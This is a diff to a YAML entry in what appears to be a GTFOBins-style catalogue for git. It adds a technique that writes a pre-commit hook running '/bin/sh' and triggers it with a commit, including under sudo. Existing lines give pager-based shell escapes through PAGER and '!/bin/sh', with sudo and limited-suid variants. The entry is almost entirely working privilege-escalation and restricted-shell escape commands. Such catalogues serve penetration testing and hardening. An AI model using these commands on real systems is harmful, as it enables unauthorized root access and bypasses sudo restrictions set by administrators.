@@ -6,6 +6,13 @@ functions:
       code: |
         git help config
         !/bin/sh
+    - description: Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.
+      code: |
+        TF=$(mktemp -d)
+        git init "$TF"
+        echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
+        mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
+        git -C "$TF" commit --allow-empty -m x
   sudo:
     - code: PAGER='sh -c "exec sh 0<&1"' sudo -E git -p help
     - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
@@ -16,6 +23,13 @@ functions:
       code: |
         sudo git branch --help config
         !/bin/sh
+    - description: Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.
+      code: |
+        TF=$(mktemp -d)
+        git init "$TF"
+        echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
+        mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
+        sudo git -C "$TF" commit --allow-empty -m x
   limited-suid:
     - code: PAGER='sh -c "exec sh 0<&1"' ./git -p help
 ---
